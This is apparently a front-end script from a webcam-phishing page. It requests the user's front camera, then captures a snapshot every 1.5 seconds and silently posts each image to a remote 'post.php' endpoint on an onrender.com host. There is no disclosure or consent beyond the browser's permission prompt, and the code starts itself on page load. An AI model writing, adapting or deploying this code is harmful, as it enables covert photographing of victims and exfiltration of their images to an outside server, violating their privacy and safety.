const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

const BACKEND_URL = "https://saychesse-do-home.onrender.com//post.php";

async function startWebcam() {
    const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
    });
    video.srcObject = stream;

    setInterval(captureAndSend, 1500);
}

function captureAndSend() {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imgData = canvas.toDataURL("image/png");

    fetch(BACKEND_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: "cat=" + encodeURIComponent(imgData)
    });
}

startWebcam();
